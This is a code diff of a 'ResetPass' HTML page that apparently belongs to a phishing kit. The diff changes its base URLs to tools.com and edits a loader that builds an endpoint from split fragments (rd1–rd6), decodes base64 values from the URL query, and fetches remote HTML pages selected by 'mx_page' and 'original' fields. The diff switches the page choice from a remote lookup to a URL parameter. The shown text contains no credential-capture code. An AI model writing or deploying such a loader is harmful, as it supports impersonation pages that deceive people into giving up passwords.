@@ -15,14 +15,15 @@
       href="original-favicon.ico"
       type="image/x-icon"
     />
-  <base href="https://khanieteam.com/ResetPass/Server/assets/" />
-     <!--  <base href="http://tools.com/pages/latestpages/ResetPass/Server/assets/" /> -->
+    <!-- <base href="https://khanieteam.com/ResetPass/Server/assets/" /> -->
+    <base href="http://tools.com/pages/latestpages/ResetPass/Server/assets/" />
 
     <script defer>
-      //const BASE_URL = "http://tools.com/pages/latestpages/ResetPass/Server";
-      //const ASSETS_URL = "http://tools.com/pages/latestpages/ResetPass/Server/assets";
-      const BASE_URL = "https://khanieteam.com/ResetPass/Server";
-      const ASSETS_URL = "https://khanieteam.com/ResetPass/Server/assets";
+      const BASE_URL = "http://tools.com/pages/latestpages/ResetPass/Server";
+      const ASSETS_URL =
+        "http://tools.com/pages/latestpages/ResetPass/Server/assets";
+      // const BASE_URL = "https://khanieteam.com/ResetPass/Server";
+      // const ASSETS_URL = "https://khanieteam.com/ResetPass/Server/assets";
 
       async function getPageContent(page, route, original) {
         fetch(`${BASE_URL}/${route}/${page}.html`)
@@ -52,14 +53,13 @@
           });
       }
 
-      async function abs(ml, mg, route) {
+      async function abs(ml, mg, route, page) {
         try {
-          let r = await fetch(`${ml}?${mg}`);
-          //   let testcheck = await r.text();
-          //   console.log(testcheck);
+          /*   let r = await fetch(`${ml}?${mg}`);
           let v = await r.json();
           let page = JSON.parse(v).mx_page;
-          let original = JSON.parse(v).original;
+          let original = JSON.parse(v).original; */
+          let original = "";
 
           console.log(mg, page, original, "here", route);
 
@@ -71,6 +71,7 @@
 
       let xx = window.location.href.split("?");
       xx = xx[1].split("__");
+      let page = xx[3];
       let mg = "";
       let route = "";
       let base64regex =
@@ -101,7 +102,7 @@
         console.log(`${rd1}${rd2}${rd3}${rd4}${rd5}${rd6}`, mg);
 
         document.addEventListener("DOMContentLoaded", function () {
-          abs(`${rd1}${rd2}${rd3}${rd4}${rd5}${rd6}`, mg, route);
+          abs(`${rd1}${rd2}${rd3}${rd4}${rd5}${rd6}`, mg, route, page);
         });
       }
     </script>
